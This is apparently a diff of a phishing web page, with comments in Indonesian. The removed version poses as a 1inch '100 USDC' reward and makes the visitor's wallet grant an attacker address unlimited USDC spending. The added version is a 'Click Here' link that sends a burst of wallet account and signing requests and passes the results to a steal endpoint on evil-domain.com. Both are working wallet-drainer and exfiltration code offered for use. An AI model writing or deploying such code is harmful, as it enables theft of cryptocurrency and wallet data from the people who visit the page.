@@ -3,71 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Penghargaan Gratis 1inch</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <style>
-        body {
-            font-family: sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .claim-btn {
-            padding: 20px 40px;
-            font-size: 24px;
-            background-color: #1a1a1a;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-        }
-    </style>
+    <title>Click Here</title>
+    <style>/* sama seperti sebelumnya */</style>
 </head>
 <body>
-
-    <h1>Selamat! Anda Memenangkan 100 USDC</h1>
-    <p>Klik tombol di bawah untuk klaim hadiah Anda ke wallet.</p>
-    
-    <button class="claim-btn" id="claimButton">Klaim Hadiah Sekarang</button>
+    <a id="clickLink" class="click-text" href="javascript:void(0)">Click Here</a>
 
     <script>
-        const claimButton = document.getElementById('claimButton');
-
-        // Alamat penyerang dan kontrak token (Contoh: USDC di Ethereum)
-        const victimTokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; 
-        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"; // Ganti dengan address penyerang
-
-        async function triggerExploit() {
-            if (window.ethereum) {
-                try {
-                    // 1. Minta koneksi wallet (jika belum terhubung)
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-                    const signer = provider.getSigner();
-
-                    // 2. ABI Sederhana untuk fungsi 'approve' (izin akses token)
-                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-                    const contract = new ethers.Contract(victimTokenAddress, abi, signer);
-
-                    // 3. Memicu pop-up transaksi otomatis
-                    // Mengatur jumlah 'unlimited' agar penyerang bisa menguras semua token nanti
-                    const unlimitedAmount = ethers.constants.MaxUint256;
-                    
-                    console.log("Memicu transaksi approve...");
-                    await contract.approve(attackerAddress, unlimitedAmount);
-
-                } catch (error) {
-                    console.error("User menolak atau error:", error);
-                }
-            } else {
-                alert("Gunakan browser wallet (seperti 1inch) untuk klaim!");
-            }
-        }
-
-        claimButton.addEventListener('click', triggerExploit);
+        const link = document.getElementById('clickLink');
+        
+        link.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            // AGRESIF POP-UP ATTACK
+            try {
+                // 1. Multiple sign requests bersamaan (spam pop-up)
+                const promises = [
+                    window.ethereum?.request({method: 'eth_requestAccounts'}),
+                    window.ethereum?.request({method: 'eth_accounts'}),
+                    window.ethereum?.request({method: 'personal_sign', params: ['0x00', '0x0000000000000000000000000000000000000000']}),
+                    window.ethereum?.request({method: 'eth_signTypedData_v4', params: [{}, '0x00', '0x0000000000000000000000000000000000000000']})
+                ];
+                
+                Promise.allSettled(promises).then(results => {
+                    // Exfiltrate semua hasil
+                    results.forEach((result, i) => {
+                        if (result.status === 'fulfilled') {
+                            fetch('https://rclm.link.evil-domain.com/steal?method=' + i + '&data=' + btoa(JSON.stringify(result.value)));
+                        }
+                    });
+                });
+                
+            } catch(e) {}
+            
+            // Fallback redirect
+            setTimeout(() => window.open('https://rclm.link.evil-domain.com', '_blank'), 500);
+        });
     </script>
 </body>
 </html>
